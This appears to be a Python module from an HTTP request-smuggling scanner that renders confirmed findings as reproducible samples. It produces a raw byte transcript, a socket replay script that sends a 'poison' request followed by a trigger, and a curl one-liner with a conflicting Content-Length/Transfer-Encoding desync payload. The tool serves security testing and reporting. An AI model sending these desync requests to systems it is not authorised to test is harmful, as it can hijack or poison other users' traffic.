"""Reproducible-request rendering.

For a confirmed finding we want something a human can run elsewhere: a raw
request transcript (so the exact bytes are visible, including CR/LF and the
ambiguous framing) and a copy-paste command.  Because smuggling requests are
byte-sensitive, ``curl`` is a poor fit; the recommended form is a tiny
``socket`` snippet that writes the transcript verbatim.  A ``curl
--data-binary`` one-liner is offered as a secondary, best-effort form.

Samples use a redacted host/port by default and a fixed marker so the bytes are
stable and reviewable, not the random nonces used during probing.
"""

from __future__ import annotations

import json
from dataclasses import dataclass

__all__ = ["Sample", "build_sample"]


@dataclass
class Sample:
    marker: str
    request: bytes
    trigger: bytes | None
    description: str

    def transcript(self) -> str:
        """Human-readable bytes: CR/LF made visible, non-printables escaped."""
        def show(b: bytes) -> str:
            out = []
            i = 0
            while i < len(b):
                if b[i:i + 2] == b"\r\n":
                    out.append("\\r\\n\n")
                    i += 2
                elif b[i] == 0x0A:
                    out.append("\\n\n")
                    i += 1
                elif b[i] == 0x0D:
                    out.append("\\r")
                    i += 1
                elif 0x20 <= b[i] < 0x7F:
                    out.append(chr(b[i]))
                    i += 1
                else:
                    out.append(f"\\x{b[i]:02x}")
                    i += 1
            return "".join(out)
        text = show(self.request)
        if self.trigger:
            text += "\n# --- open a NEW connection and send ---\n" + show(self.trigger)
        return text

    def python_replay(self, host: str = "TARGET", port: int | str = "PORT") -> str:
        lines = [
            "import socket, time",
            f"HOST, PORT = {host!r}, int({port!r})",
            "",
            "poison = (",
        ]
        for chunk in _py_bytes_chunks(self.request):
            lines.append(f"    {chunk}")
        lines.append(")")
        lines += [
            "",
            "s = socket.create_connection((HOST, PORT), timeout=3)",
            "s.sendall(poison)",
            "time.sleep(0.1)",
            "s.close()          # close the attacker connection first",
            "",
            "# Now a fresh connection; the hidden request executes for it if the",
            "# two hops disagreed about where the poison's body ended:",
            "t = socket.create_connection((HOST, PORT), timeout=3)",
        ]
        if self.trigger:
            lines.append("trigger = (")
            for chunk in _py_bytes_chunks(self.trigger):
                lines.append(f"    {chunk}")
            lines.append(")")
            lines.append("t.sendall(trigger)")
        else:
            lines.append("t.sendall(b'GET / HTTP/1.1\\r\\nHost: target\\r\\n\\r\\n')")
        lines += [
            "print(t.recv(65535))",
            "t.close()",
        ]
        return "\n".join(lines) + "\n"

    def curl_hint(self, host: str = "TARGET", port: int | str = "PORT") -> str:
        # Best effort only: --data-binary preserves bytes but curl always sends
        # a well-formed request line, so this cannot reproduce every shape.
        return (
            f"# best-effort; curl cannot send a malformed request line, so prefer the python replay\n"
            f"curl -sS --http1.1 -H 'Transfer-Encoding: chunked' "
            f"-H 'Content-Length: 13' --data-binary $'0\\r\\n\\r\\nGET / HTTP/1.1\\r\\n\\r\\n' "
            f"http://{host}:{port}/"
        )


def _py_bytes_chunks(b: bytes) -> list[str]:
    """Split bytes into printable Python literal pieces, one per line."""
    chunks: list[str] = []
    current = ""
    for byte in b:
        if byte == 0x0D:
            current += "\\r"
        elif byte == 0x0A:
            current += "\\n"
            chunks.append(f"b'{current}'")
            current = ""
        elif 0x20 <= byte < 0x7F and byte not in (0x5C, 0x27):  # \\ and '
            current += chr(byte)
        elif byte == 0x5C:
            current += "\\\\"
        elif byte == 0x27:
            current += "\\'"
        else:
            current += f"\\x{byte:02x}"
    if current:
        chunks.append(f"b'{current}'")
    return chunks


def build_sample(shape_key: str, *, marker: str = "SMUGGLE_MARKER") -> Sample:
    """Rebuild the canonical poison bytes for ``shape_key`` with a fixed marker."""
    from .engine import WIRE_SHAPES_BY_KEY, _bait, _hidden

    shape = WIRE_SHAPES_BY_KEY[shape_key]
    # Use a fixed-size hidden body so the sample is stable and self-contained;
    # the hidden body is filled by the trigger connection in the real probe.
    request = shape.poison(marker, 96)
    trigger = _bait("TRIGGER_MARKER", 96)
    return Sample(
        marker=marker,
        request=request,
        trigger=trigger,
        description=shape.explanation,
    )
